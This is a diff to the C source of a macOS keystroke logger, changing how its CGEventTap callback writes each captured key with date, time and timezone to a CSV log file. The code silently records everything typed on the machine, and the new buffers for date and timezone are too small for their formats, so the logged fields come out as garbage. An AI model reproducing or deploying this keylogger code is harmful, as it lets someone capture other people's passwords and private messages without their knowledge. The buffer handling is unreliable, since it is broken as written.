@@ -62,10 +62,17 @@ CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef e
     // Print csv row
     time_t t = time(NULL);
     struct tm tm = *localtime(&t);
-    char date[26];
-    strftime(date, 10, "%Y-%m-%d", &tm);
+    char date[9];
+    char time[9];
+    char tz[5];
+    strftime(date, 9, "%Y-%m-%d", &tm);
+    strftime(time, 9, "%H:%M:%S", &tm);
+    strftime(tz, 5, "%z", &tm);
     // Key, Time, Date, TimeZone
-    fprintf(logfile, "%s,%s,%s,%ld", convertKeyCode(keyCode), asctime(&tm), date, tm.tm_gmtoff);
+    fprintf(logfile, "\n%s", convertKeyCode(keyCode));
+    fprintf(logfile, ",%s", date);
+    fprintf(logfile, ",%s", time);
+    fprintf(logfile, ",%s", tz);
     fflush(logfile);
 
     return event;
